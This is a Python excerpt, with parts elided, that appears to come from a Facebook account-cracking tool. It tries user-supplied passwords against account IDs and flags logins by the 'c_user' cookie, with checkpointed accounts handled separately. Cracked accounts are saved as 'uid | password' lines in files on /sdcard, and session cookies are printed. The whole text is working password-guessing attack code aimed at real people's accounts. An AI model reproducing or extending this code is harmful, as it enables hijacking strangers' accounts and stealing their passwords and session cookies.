...
def xxr():
    ...
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {Ratul} : ")
        HamiiID.append(pww)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[Ratul-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                os.system('espeak -a 300 " Tutul,  Ok,  id"')
                cek_apk(session,coki)
                open('/sdcard/Ratul-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[Ratull-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                #os.system("play op.mp3")
                os.system('espeak -a 300 " C,  p"')
                open('/sdcard/Ratul-CP😁😁.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}Ratul-XD{x}]>~[%s]>~<[%s]-[OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
